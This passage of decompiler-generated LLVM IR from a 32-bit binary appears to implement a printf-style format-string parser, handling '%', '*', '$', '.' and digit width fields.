  %v4_10009238 = inttoptr i32 %v3_10009238 to i8*
  store i8 %v1_10009238, i8* %v4_10009238, align 1
  %v0_1000923c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000923c = urem i32 %v0_1000923c, 256
  store i32 %v1_1000923c, i32* %r0.global-to-local, align 4
  %v0_10009244 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009244 = add i32 %v0_10009244, -4
  %v2_10009244 = inttoptr i32 %v1_10009244 to i32*
  %v3_10009244 = load i32, i32* %v2_10009244, align 4
  store i32 %v3_10009244, i32* %r9.global-to-local, align 4
  %v4_10009248 = icmp eq i32 %v1_1000923c, %v3_10009244
  br i1 %v4_10009248, label %dec_label_pc_10009250, label %dec_label_pc_100096c0

dec_label_pc_10009250:                            ; preds = %dec_label_pc_10009224
  %v3_10009240 = icmp eq i32 %v1_1000923c, 0
  br i1 %v3_10009240, label %dec_label_pc_10009258, label %dec_label_pc_10009254

dec_label_pc_10009254:                            ; preds = %dec_label_pc_10009250
  %v0_10009254 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009254 = add i32 %v0_10009254, -1
  store i32 %v1_10009254, i32* %ctr.global-to-local, align 4
  %v2_10009254 = icmp eq i32 %v1_10009254, 0
  br i1 %v2_10009254, label %dec_label_pc_10009258, label %dec_label_pc_10009254.dec_label_pc_10009224_crit_edge

dec_label_pc_10009254.dec_label_pc_10009224_crit_edge: ; preds = %dec_label_pc_10009254
  %v0_10009224.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_10009228.pre = load i32, i32* @r7, align 4
  %v0_1000922c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10009224

dec_label_pc_10009258:                            ; preds = %dec_label_pc_10009254, %dec_label_pc_10009250
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000925c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_10009264

dec_label_pc_10009264:                            ; preds = %dec_label_pc_100091f8, %dec_label_pc_10009258
  %v2_10009274.pre-phi = phi i32 [ %.pre, %dec_label_pc_100091f8 ], [ %v2_10009220, %dec_label_pc_10009258 ]
  %storemerge3 = phi i32 [ %v2_100091f8, %dec_label_pc_100091f8 ], [ %v2_1000925c, %dec_label_pc_10009258 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* @r27, align 4
  store i32 %v2_10009274.pre-phi, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009284

dec_label_pc_10009280:                            ; preds = %dec_label_pc_10009390, %dec_label_pc_10009414
  %v0_10009280 = phi i32 [ %v1_10009414, %dec_label_pc_10009414 ], [ %v0_10009378, %dec_label_pc_10009390 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_10009414 ], [ %stack_var_-84.2, %dec_label_pc_10009390 ]
  store i32 %v0_10009280, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10009284

dec_label_pc_10009284:                            ; preds = %dec_label_pc_10009264, %dec_label_pc_10009280
  %v0_10009298 = phi i32 [ %storemerge3, %dec_label_pc_10009264 ], [ %v0_10009280, %dec_label_pc_10009280 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_10009264 ], [ %stack_var_-84.0, %dec_label_pc_10009280 ]
  %v1_10009284 = inttoptr i32 %v0_10009298 to i8*
  %v2_10009284 = load i8, i8* %v1_10009284, align 1
  %v3_10009284 = zext i8 %v2_10009284 to i32
  store i32 %v3_10009284, i32* %r0.global-to-local, align 4
  store i32 %v0_10009298, i32* @r30, align 4
  %v3_1000928c = icmp eq i8 %v2_10009284, 42
  br i1 %v3_1000928c, label %dec_label_pc_10009294, label %dec_label_pc_100092a4

dec_label_pc_10009294:                            ; preds = %dec_label_pc_10009284
  %v0_10009294 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009294 = mul i32 %v0_10009294, -4
  store i32 %v1_10009294, i32* %r0.global-to-local, align 4
  %v1_10009298 = add i32 %v0_10009298, 1
  store i32 %v1_10009298, i32* @r30, align 4
  %v0_1000929c = load i32, i32* @r1, align 4
  %v2_1000929c = add i32 %v0_1000929c, %v1_10009294
  store i32 %v2_1000929c, i32* %r9.global-to-local, align 4
  %v0_100092a0 = load i32, i32* @r29, align 4
  %v2_100092a0 = add i32 %v2_1000929c, 8
  %v3_100092a0 = inttoptr i32 %v2_100092a0 to i32*
  store i32 %v0_100092a0, i32* %v3_100092a0, align 4
  %v0_100092bc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100092a4

dec_label_pc_100092a4:                            ; preds = %dec_label_pc_10009284, %dec_label_pc_10009294
  %v0_100092bc.pre = phi i32 [ %v0_10009298, %dec_label_pc_10009284 ], [ %v0_100092bc.pre.pre, %dec_label_pc_10009294 ]
  %v3_100092a4 = load i32, i32* @global_var_100249e8, align 4
  store i32 %v3_100092a4, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_100092bc

dec_label_pc_100092b0:                            ; preds = %dec_label_pc_100092bc
  %v2_100092c0 = icmp sgt i32 %v0_10009308, 4094
  br i1 %v2_100092c0, label %dec_label_pc_100092b8, label %dec_label_pc_100092b4

dec_label_pc_100092b4:                            ; preds = %dec_label_pc_100092b0
  %v1_100092b4 = add i32 %v2_100092d4, -48
  store i32 %v1_100092b4, i32* @r8, align 4
  br label %dec_label_pc_100092b8

dec_label_pc_100092b8:                            ; preds = %dec_label_pc_100092b0, %dec_label_pc_100092b4
  %v0_100092c015 = phi i32 [ %v0_10009308, %dec_label_pc_100092b0 ], [ %v1_100092b4, %dec_label_pc_100092b4 ]
  %v1_100092b8 = add i32 %v0_10009338, 1
  store i32 %v1_100092b8, i32* @r30, align 4
  br label %dec_label_pc_100092bc

dec_label_pc_100092bc:                            ; preds = %dec_label_pc_100092a4, %dec_label_pc_100092b8
  %v0_10009308 = phi i32 [ 0, %dec_label_pc_100092a4 ], [ %v0_100092c015, %dec_label_pc_100092b8 ]
  %v0_10009338 = phi i32 [ %v0_100092bc.pre, %dec_label_pc_100092a4 ], [ %v1_100092b8, %dec_label_pc_100092b8 ]
  %v1_100092bc = inttoptr i32 %v0_10009338 to i8*
  %v2_100092bc = load i8, i8* %v1_100092bc, align 1
  %v3_100092bc = zext i8 %v2_100092bc to i32
  store i32 %v3_100092bc, i32* %r11.global-to-local, align 4
  %v1_100092c4 = mul nuw nsw i32 %v3_100092bc, 2
  store i32 %v1_100092c4, i32* %r9.global-to-local, align 4
  %v2_100092c8 = add i32 %v1_100092c4, %v3_100092a4
  %v3_100092c8 = inttoptr i32 %v2_100092c8 to i16*
  %v4_100092c8 = load i16, i16* %v3_100092c8, align 2
  %v5_100092c8 = zext i16 %v4_100092c8 to i32
  store i32 %v5_100092c8, i32* %r0.global-to-local, align 4
  %v1_100092cc = mul i32 %v0_10009308, 10
  %v1_100092d0 = and i32 %v5_100092c8, 8
  store i32 %v1_100092d0, i32* @r25, align 4
  %v3_100092d0 = icmp eq i32 %v1_100092d0, 0
  %v2_100092d4 = add i32 %v3_100092bc, %v1_100092cc
  store i32 %v2_100092d4, i32* %r9.global-to-local, align 4
  br i1 %v3_100092d0, label %dec_label_pc_100092dc, label %dec_label_pc_100092b0

dec_label_pc_100092dc:                            ; preds = %dec_label_pc_100092bc
  %v0_100092dc = load i32, i32* %r10.global-to-local, align 4
  %v1_100092dc = add i32 %v0_100092dc, -1
  %v2_100092dc = inttoptr i32 %v1_100092dc to i8*
  %v3_100092dc = load i8, i8* %v2_100092dc, align 1
  %v4_100092dc = zext i8 %v3_100092dc to i32
  store i32 %v4_100092dc, i32* %r0.global-to-local, align 4
  %v3_100092e0 = icmp eq i8 %v3_100092dc, 37
  br i1 %v3_100092e0, label %dec_label_pc_100092e8, label %dec_label_pc_100093b0

dec_label_pc_100092e8:                            ; preds = %dec_label_pc_100092dc
  %v3_100092e8 = icmp eq i8 %v2_100092bc, 36
  br i1 %v3_100092e8, label %dec_label_pc_100092f0, label %dec_label_pc_10009324

dec_label_pc_100092f0:                            ; preds = %dec_label_pc_100092e8
  %tmp58 = icmp slt i32 %v0_10009308, 1
  br i1 %tmp58, label %dec_label_pc_10009324, label %dec_label_pc_100092f8

dec_label_pc_100092f8:                            ; preds = %dec_label_pc_100092f0
  %v0_100092f8 = load i32, i32* @r26, align 4
  %v3_100092f8 = icmp eq i32 %v0_100092f8, 0
  %v1_100092fc = add i32 %v0_10009338, 1
  store i32 %v1_100092fc, i32* %r10.global-to-local, align 4
  br i1 %v3_100092f8, label %dec_label_pc_100096c0, label %dec_label_pc_10009304

dec_label_pc_10009304:                            ; preds = %dec_label_pc_100092f8
  %v3_10009304 = icmp sgt i32 %v0_10009308, %v0_100092f8
  br i1 %v3_10009304, label %dec_label_pc_10009310, label %dec_label_pc_1000931c

dec_label_pc_10009310:                            ; preds = %dec_label_pc_10009304
  store i32 %v0_10009308, i32* @r26, align 4
  br label %dec_label_pc_1000931c

dec_label_pc_10009318:                            ; preds = %dec_label_pc_10009340, %dec_label_pc_10009338
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000931c

dec_label_pc_1000931c:                            ; preds = %dec_label_pc_10009304, %dec_label_pc_10009310, %dec_label_pc_10009318
  %v0_1000931c = phi i32 [ %v0_100092dc, %dec_label_pc_10009318 ], [ %v1_100092fc, %dec_label_pc_10009310 ], [ %v1_100092fc, %dec_label_pc_10009304 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_10009318 ], [ %v0_10009308, %dec_label_pc_10009310 ], [ %v0_10009308, %dec_label_pc_10009304 ]
  br label %dec_label_pc_10009358

dec_label_pc_10009324:                            ; preds = %dec_label_pc_100092e8, %dec_label_pc_100092f0
  %v0_10009324 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_10009324, 1
  br i1 %tmp59, label %dec_label_pc_10009338, label %dec_label_pc_1000932c

dec_label_pc_1000932c:                            ; preds = %dec_label_pc_10009324
  %v3_1000932c = icmp eq i8 %v2_100092bc, 109
  br i1 %v3_1000932c, label %dec_label_pc_100093b0, label %dec_label_pc_100096c0

dec_label_pc_10009338:                            ; preds = %dec_label_pc_10009324
  %v3_10009338 = icmp ugt i32 %v0_10009338, %v0_100092dc
  br i1 %v3_10009338, label %dec_label_pc_10009340, label %dec_label_pc_10009318

dec_label_pc_10009340:                            ; preds = %dec_label_pc_10009338
  %v1_10009340 = inttoptr i32 %v0_100092dc to i8*
  %v2_10009340 = load i8, i8* %v1_10009340, align 1
  %v3_10009340 = zext i8 %v2_10009340 to i32
  store i32 %v3_10009340, i32* %r0.global-to-local, align 4
  store i32 %v0_100092dc, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000934c = icmp eq i8 %v2_10009340, 48
  br i1 %v3_1000934c, label %dec_label_pc_10009318, label %dec_label_pc_100093b4

dec_label_pc_10009358:                            ; preds = %dec_label_pc_10009374, %dec_label_pc_1000931c
  %v0_10009378 = phi i32 [ %v0_1000931c, %dec_label_pc_1000931c ], [ %v1_10009378, %dec_label_pc_10009374 ]
  store i32 %v0_10009378, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001295c.583 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10009368 = inttoptr i32 %v0_10009378 to i8*
  br label %dec_label_pc_10009360

dec_label_pc_10009360:                            ; preds = %dec_label_pc_10009380, %dec_label_pc_10009358
  %v1_10009374 = phi i32 [ %v1_10009384, %dec_label_pc_10009380 ], [ 1, %dec_label_pc_10009358 ]
  %v0_10009360 = phi i32 [ %v1_10009364, %dec_label_pc_10009380 ], [ ptrtoint ([8 x i8]* @global_var_1001295c.583 to i32), %dec_label_pc_10009358 ]
  %v1_10009360 = inttoptr i32 %v0_10009360 to i8*
  %v2_10009360 = load i8, i8* %v1_10009360, align 1
  %v3_10009360 = zext i8 %v2_10009360 to i32
  store i32 %v3_10009360, i32* %r9.global-to-local, align 4
  %v1_10009364 = add i32 %v0_10009360, 1
  store i32 %v1_10009364, i32* %r11.global-to-local, align 4
  %v2_10009368 = load i8, i8* %v1_10009368, align 1
  %v3_10009368 = zext i8 %v2_10009368 to i32
  store i32 %v3_10009368, i32* %r0.global-to-local, align 4
  %v4_1000936c = icmp eq i8 %v2_10009368, %v2_10009360
  br i1 %v4_1000936c, label %dec_label_pc_10009374, label %dec_label_pc_10009380

dec_label_pc_10009374:                            ; preds = %dec_label_pc_10009360
  %v0_10009374 = load i32, i32* %r6.global-to-local, align 4
  %v2_10009374 = or i32 %v0_10009374, %v1_10009374
  store i32 %v2_10009374, i32* %r6.global-to-local, align 4
  %v1_10009378 = add i32 %v0_10009378, 1
  br label %dec_label_pc_10009358

dec_label_pc_10009380:                            ; preds = %dec_label_pc_10009360
  %v1_10009380 = inttoptr i32 %v1_10009364 to i8*
  %v2_10009380 = load i8, i8* %v1_10009380, align 1
  %v3_10009380 = zext i8 %v2_10009380 to i32
  store i32 %v3_10009380, i32* %r0.global-to-local, align 4
  %v1_10009384 = mul i32 %v1_10009374, 2
  store i32 %v1_10009384, i32* %r10.global-to-local, align 4
  %v3_10009388 = icmp eq i8 %v2_10009380, 0
  br i1 %v3_10009388, label %dec_label_pc_10009390, label %dec_label_pc_10009360

dec_label_pc_10009390:                            ; preds = %dec_label_pc_10009380
  %v1_10009390 = add i32 %v0_10009378, -1
  %v2_10009390 = inttoptr i32 %v1_10009390 to i8*
  %v3_10009390 = load i8, i8* %v2_10009390, align 1
  %v4_10009390 = zext i8 %v3_10009390 to i32
  store i32 %v4_10009390, i32* %r0.global-to-local, align 4
  %v0_10009394 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009394 = and i32 %v0_10009394, 10
  store i32 0, i32* @r8, align 4
  %v3_1000939c = icmp eq i8 %v3_10009390, 37
  %v1_100093a0 = udiv i32 %v1_10009394, 2
  store i32 %v1_100093a0, i32* %r9.global-to-local, align 4
  %v2_100093a4 = sub nuw nsw i32 -1, %v1_100093a0
  %v3_100093a4 = and i32 %v0_10009394, %v2_100093a4
  store i32 %v3_100093a4, i32* %r6.global-to-local, align 4
  br i1 %v3_1000939c, label %dec_label_pc_100093b4, label %dec_label_pc_10009280

dec_label_pc_100093b0:                            ; preds = %dec_label_pc_100092dc, %dec_label_pc_1000932c
  store i32 %v0_100092dc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100093b4

dec_label_pc_100093b4:                            ; preds = %dec_label_pc_10009340, %dec_label_pc_10009390, %dec_label_pc_100093b0
  %v0_100093e8 = phi i32 [ 0, %dec_label_pc_10009390 ], [ %v0_10009308, %dec_label_pc_10009340 ], [ %v0_10009308, %dec_label_pc_100093b0 ]
  %v1_100093f4 = phi i32 [ %v0_10009378, %dec_label_pc_10009390 ], [ %v0_10009338, %dec_label_pc_10009340 ], [ %v0_10009338, %dec_label_pc_100093b0 ]
  %v0_100093f0 = phi i32 [ %v1_10009364, %dec_label_pc_10009390 ], [ %v0_100092dc, %dec_label_pc_10009340 ], [ %v0_100092dc, %dec_label_pc_100093b0 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_10009390 ], [ %stack_var_-84.1, %dec_label_pc_10009340 ], [ %stack_var_-84.1, %dec_label_pc_100093b0 ]
  %v1_100093b4 = inttoptr i32 %v0_100093f0 to i8*
  %v2_100093b4 = load i8, i8* %v1_100093b4, align 1
  %v3_100093b4 = zext i8 %v2_100093b4 to i32
  store i32 %v3_100093b4, i32* %r0.global-to-local, align 4
  %v3_100093b8 = icmp eq i8 %v2_100093b4, 42
  br i1 %v3_100093b8, label %dec_label_pc_100093c0, label %dec_label_pc_10009400

dec_label_pc_100093c0:                            ; preds = %dec_label_pc_100093b4
  %v0_100093c0 = load i32, i32* @r26, align 4
  %v3_100093c0 = icmp eq i32 %v0_100093c0, 0
  br i1 %v3_100093c0, label %dec_label_pc_100093f0, label %dec_label_pc_100093c8

dec_label_pc_100093c8:                            ; preds = %dec_label_pc_100093c0
  %v1_100093c8 = inttoptr i32 %v1_100093f4 to i8*
  %v2_100093c8 = load i8, i8* %v1_100093c8, align 1
  %v3_100093c8 = zext i8 %v2_100093c8 to i32
  store i32 %v3_100093c8, i32* %r0.global-to-local, align 4
  %v3_100093cc = icmp eq i8 %v2_100093c8, 36
  br i1 %v3_100093cc, label %dec_label_pc_100093d4, label %dec_label_pc_100096c0

dec_label_pc_100093d4:                            ; preds = %dec_label_pc_100093c8
  %tmp60 = icmp slt i32 %v0_100093e8, 1
  br i1 %tmp60, label %dec_label_pc_100096c0, label %dec_label_pc_100093dc

dec_label_pc_100093dc:                            ; preds = %dec_label_pc_100093d4
  %v0_100093dc = load i32, i32* %r5.global-to-local, align 4
  %v1_100093dc = mul i32 %v0_100093dc, -4
  %v1_100093e0 = add i32 %v1_100093f4, 1
  store i32 %v1_100093e0, i32* @r30, align 4
  %v0_100093e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_100093e4 = add i32 %v0_100093e4, %v1_100093dc
  store i32 %v2_100093e4, i32* %r9.global-to-local, align 4
  %v2_100093e8 = add i32 %v2_100093e4, 12
  %v3_100093e8 = inttoptr i32 %v2_100093e8 to i32*
  store i32 %v0_100093e8, i32* %v3_100093e8, align 4
  %v0_10009408.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100093fc

dec_label_pc_100093f0:                            ; preds = %dec_label_pc_100093c0
  %v1_100093f0 = add i32 %v0_100093f0, 1
  store i32 %v1_100093f0, i32* %r0.global-to-local, align 4
  %v4_100093f4 = icmp eq i32 %v1_100093f0, %v1_100093f4
  br i1 %v4_100093f4, label %dec_label_pc_100093fc, label %dec_label_pc_100096c0

dec_label_pc_100093fc:                            ; preds = %dec_label_pc_100093f0, %dec_label_pc_100093dc
  %v0_10009408.pre = phi i32 [ %v1_100093f4, %dec_label_pc_100093f0 ], [ %v0_10009408.pre.pre, %dec_label_pc_100093dc ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_10009400

dec_label_pc_10009400:                            ; preds = %dec_label_pc_100093b4, %dec_label_pc_100093fc
  %v0_10009408 = phi i32 [ %v1_100093f4, %dec_label_pc_100093b4 ], [ %v0_10009408.pre, %dec_label_pc_100093fc ]
  %v0_10009418 = phi i32 [ %v0_100093e8, %dec_label_pc_100093b4 ], [ -2147483648, %dec_label_pc_100093fc ]
  %v0_10009400 = load i32, i32* %r5.global-to-local, align 4
  %v3_10009400 = icmp eq i32 %v0_10009400, 0
  %v1_10009408 = inttoptr i32 %v0_10009408 to i8*
  br i1 %v3_10009400, label %dec_label_pc_10009408, label %dec_label_pc_1000942c

dec_label_pc_10009408:                            ; preds = %dec_label_pc_10009400
  %v2_10009408 = load i8, i8* %v1_10009408, align 1
  %v3_10009408 = zext i8 %v2_10009408 to i32
  store i32 %v3_10009408, i32* %r0.global-to-local, align 4
  %v3_1000940c = icmp eq i8 %v2_10009408, 46
  br i1 %v3_1000940c, label %dec_label_pc_10009414, label %dec_label_pc_10009424

dec_label_pc_10009414:                            ; preds = %dec_label_pc_10009408
  %v1_10009414 = add i32 %v0_10009408, 1
  store i32 %v0_10009418, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009280

dec_label_pc_10009424:                            ; preds = %dec_label_pc_10009408
  store i32 %v0_10009418, i32* @r31, align 4
  br label %dec_label_pc_1000942c

dec_label_pc_1000942c:                            ; preds = %dec_label_pc_10009400, %dec_label_pc_10009424
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10009424 ], [ %v0_10009418, %dec_label_pc_10009400 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v2_10009430 = load i8, i8* %v1_10009408, align 1
  %v3_10009430 = zext i8 %v2_10009430 to i32
  store i32 %v3_10009430, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10012904.584 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009438

dec_label_pc_10009438:                            ; preds = %dec_label_pc_10009444, %dec_label_pc_1000942c
  %v0_10009444 = phi i32 [ %v1_10009444, %dec_label_pc_10009444 ], [ ptrtoint ([9 x i8]* @global_var_10012904.584 to i32), %dec_label_pc_1000942c ]
  %v1_10009438 = inttoptr i32 %v0_10009444 to i8*
  %v2_10009438 = load i8, i8* %v1_10009438, align 1
  %v3_10009438 = zext i8 %v2_10009438 to i32
  store i32 %v3_10009438, i32* %r0.global-to-local, align 4
  %v4_1000943c = icmp eq i8 %v2_10009430, %v2_10009438
  br i1 %v4_1000943c, label %dec_label_pc_10009208, label %dec_label_pc_10009444

dec_label_pc_10009444:                            ; preds = %dec_label_pc_10009438
  %v1_10009444 = add i32 %v0_10009444, 1
  %v2_10009444 = inttoptr i32 %v1_10009444 to i8*
  %v3_10009444 = load i8, i8* %v2_10009444, align 1
  %v4_10009444 = zext i8 %v3_10009444 to i32
  store i32 %v4_10009444, i32* %r0.global-to-local, align 4
  store i32 %v1_10009444, i32* %r11.global-to-local, align 4
  %v3_10009448 = icmp eq i8 %v3_10009444, 0
  br i1 %v3_10009448, label %dec_label_pc_10009450, label %dec_label_pc_10009438

dec_label_pc_10009450:                            ; preds = %dec_label_pc_10009444, %dec_label_pc_10009208
  %v0_10009478 = phi i32 [ %v1_10009208, %dec_label_pc_10009208 ], [ %v0_10009408, %dec_label_pc_10009444 ]
  %v0_10009474 = phi i32 [ %v0_10009444, %dec_label_pc_10009208 ], [ %v1_10009444, %dec_label_pc_10009444 ]
  %v2_10009458 = sub i32 %v0_10009474, ptrtoint ([9 x i8]* @global_var_10012904.584 to i32)
  store i32 %v2_10009458, i32* %r9.global-to-local, align 4
  %v2_1000945c = icmp sgt i32 %v2_10009458, 1
  br i1 %v2_1000945c, label %dec_label_pc_1000947c, label %dec_label_pc_10009464

dec_label_pc_10009464:                            ; preds = %dec_label_pc_10009450
  %v1_10009464 = inttoptr i32 %v0_10009478 to i8*
  %v2_10009464 = load i8, i8* %v1_10009464, align 1
  %v3_10009464 = zext i8 %v2_10009464 to i32
  store i32 %v3_10009464, i32* %r0.global-to-local, align 4
  %v1_10009468 = inttoptr i32 %v0_10009474 to i8*
  %v2_10009468 = load i8, i8* %v1_10009468, align 1
  %v3_10009468 = zext i8 %v2_10009468 to i32
  store i32 %v3_10009468, i32* %r9.global-to-local, align 4
  %v4_1000946c = icmp eq i8 %v2_10009464, %v2_10009468
  br i1 %v4_1000946c, label %dec_label_pc_10009474, label %dec_label_pc_1000947c

dec_label_pc_10009474:                            ; preds = %dec_label_pc_10009464
  %v1_10009474 = add i32 %v0_10009474, 9
  store i32 %v1_10009474, i32* %r11.global-to-local, align 4
  %v1_10009478 = add i32 %v0_10009478, 1
  store i32 %v1_10009478, i32* @r30, align 4
  br label %dec_label_pc_1000947c

dec_label_pc_1000947c:                            ; preds = %dec_label_pc_10009464, %dec_label_pc_10009450, %dec_label_pc_10009474
  %v0_10009480 = phi i32 [ %v0_10009474, %dec_label_pc_10009464 ], [ %v0_10009474, %dec_label_pc_10009450 ], [ %v1_10009474, %dec_label_pc_10009474 ]
  %v0_1000947c = phi i32 [ %v0_10009478, %dec_label_pc_10009464 ], [ %v0_10009478, %dec_label_pc_10009450 ], [ %v1_10009478, %dec_label_pc_10009474 ]
  %v1_1000947c = inttoptr i32 %v0_1000947c to i8*
  %v2_1000947c = load i8, i8* %v1_1000947c, align 1
  %v3_1000947c = zext i8 %v2_1000947c to i32
  store i32 %v3_1000947c, i32* @r7, align 4
  %v1_10009480 = add i32 %v0_10009480, 9
  %v2_10009480 = inttoptr i32 %v1_10009480 to i8*
  %v3_10009480 = load i8, i8* %v2_10009480, align 1
  %v4_10009480 = zext i8 %v3_10009480 to i32
  store i32 %v4_10009480, i32* %r0.global-to-local, align 4
  %v3_10009484 = icmp eq i8 %v2_1000947c, 0
  %v1_10009488 = mul nuw nsw i32 %v4_10009480, 256
  store i32 %v1_10009488, i32* %r10.global-to-local, align 4
  br i1 %v3_10009484, label %dec_label_pc_100096c0, label %dec_label_pc_10009490

dec_label_pc_10009490:                            ; preds = %dec_label_pc_1000947c
  %v1_10009494 = and i32 %v1_10009488, 1024
  store i32 %v1_10009494, i32* %r0.global-to-local, align 4
  %v3_10009494 = icmp eq i32 %v1_10009494, 0
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r3.global-to-local, align 4
  %v3_100094a0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_100094a0, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012938.586 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10012944.585 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100094b0

dec_label_pc_100094b0:                            ; preds = %dec_label_pc_10009514, %dec_label_pc_10009490
  %v1_100094bc = phi i32 [ %v1_10009514, %dec_label_pc_10009514 ], [ ptrtoint ([21 x i8]* @global_var_10012944.585 to i32), %dec_label_pc_10009490 ]
  %v1_100094b0 = inttoptr i32 %v1_100094bc to i8*
  %v2_100094b0 = load i8, i8* %v1_100094b0, align 1
  %v3_100094b0 = zext i8 %v2_100094b0 to i32
  store i32 %v3_100094b0, i32* %r0.global-to-local, align 4
  %v4_100094b4 = icmp eq i8 %v2_100094b0, %v2_1000947c
  br i1 %v4_100094b4, label %dec_label_pc_100094bc, label %dec_label_pc_10009514

dec_label_pc_100094bc:                            ; preds = %dec_label_pc_100094b0
  %v2_100094bc = sub i32 %v1_100094bc, ptrtoint ([21 x i8]* @global_var_10012944.585 to i32)
  %tmp61 = icmp slt i32 %v2_100094bc, 18
  %brmerge = or i1 %v3_10009494, %tmp61
  br i1 %brmerge, label %dec_label_pc_100094d0, label %dec_label_pc_100094cc

dec_label_pc_100094cc:                            ; preds = %dec_label_pc_100094bc
  %v1_100094cc = add i32 %v2_100094bc, -2
  br label %dec_label_pc_100094d0

dec_label_pc_100094d0:                            ; preds = %dec_label_pc_100094bc, %dec_label_pc_100094cc
  %storemerge = phi i32 [ %v1_100094cc, %dec_label_pc_100094cc ], [ %v2_100094bc, %dec_label_pc_100094bc ]
  %v0_100094d0 = phi i32 [ %v1_100094cc, %dec_label_pc_100094cc ], [ %v2_100094bc, %dec_label_pc_100094bc ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100094d0 = load i32, i32* @r28, align 4
  %v2_100094d0 = add i32 %v1_100094d0, 32
  %v3_100094d0 = inttoptr i32 %v2_100094d0 to i32*
  store i32 %v0_100094d0, i32* %v3_100094d0, align 4
  store i32 ptrtoint (i32* @global_var_10012937.587 to i32), i32* %r11.global-to-local, align 4
  %v0_100094dc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100094d8

dec_label_pc_100094d8:                            ; preds = %dec_label_pc_100094d8, %dec_label_pc_100094d0
  %v0_100094d8 = phi i32 [ %v1_100094d8, %dec_label_pc_100094d8 ], [ ptrtoint (i32* @global_var_10012937.587 to i32), %dec_label_pc_100094d0 ]
  %v1_100094d8 = add i32 %v0_100094d8, 1
  %v2_100094d8 = inttoptr i32 %v1_100094d8 to i8*
  %v3_100094d8 = load i8, i8* %v2_100094d8, align 1
  %v4_100094d8 = zext i8 %v3_100094d8 to i32
  store i32 %v4_100094d8, i32* %r0.global-to-local, align 4
  store i32 %v1_100094d8, i32* %r11.global-to-local, align 4
  %v3_100094dc = icmp sgt i32 %v0_100094dc.pre, %v4_100094d8
  br i1 %v3_100094dc, label %dec_label_pc_100094d8, label %dec_label_pc_100094e4

dec_label_pc_100094e4:                            ; preds = %dec_label_pc_100094d8
  %v0_100094e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_100094e4 = sub i32 %v1_100094d8, %v0_100094e4
  %v1_100094ec = mul i32 %v2_100094e4, 2
  store i32 %v1_100094ec, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012928.588 to i32), i32* %r9.global-to-local, align 4
  %v2_100094f4 = add i32 %v1_100094ec, ptrtoint (i32* @global_var_10012928.588 to i32)
  %v3_100094f4 = inttoptr i32 %v2_100094f4 to i16*
  %v4_100094f4 = load i16, i16* %v3_100094f4, align 2
  %v5_100094f4 = sext i16 %v4_100094f4 to i32
  store i32 %v5_100094f4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012918.589 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10012944.585 to i32), i32* @r8, align 4
  %v2_10009504 = add i32 %v1_100094ec, ptrtoint (i32* @global_var_10012918.589 to i32)
  %v3_10009504 = inttoptr i32 %v2_10009504 to i16*
  %v4_10009504 = load i16, i16* %v3_10009504, align 2
  %v5_10009504 = sext i16 %v4_10009504 to i32
  store i32 %v5_10009504, i32* %r9.global-to-local, align 4
  %v2_10009508 = or i32 %v5_100094f4, %v1_10009488
  store i32 %v2_10009508, i32* %r0.global-to-local, align 4
  %v2_1000950c = and i32 %v5_10009504, %v2_10009508
  store i32 %v2_1000950c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009520

dec_label_pc_10009514:                            ; preds = %dec_label_pc_100094b0
  %v1_10009514 = add i32 %v1_100094bc, 1
  %v2_10009514 = inttoptr i32 %v1_10009514 to i8*
  %v3_10009514 = load i8, i8* %v2_10009514, align 1
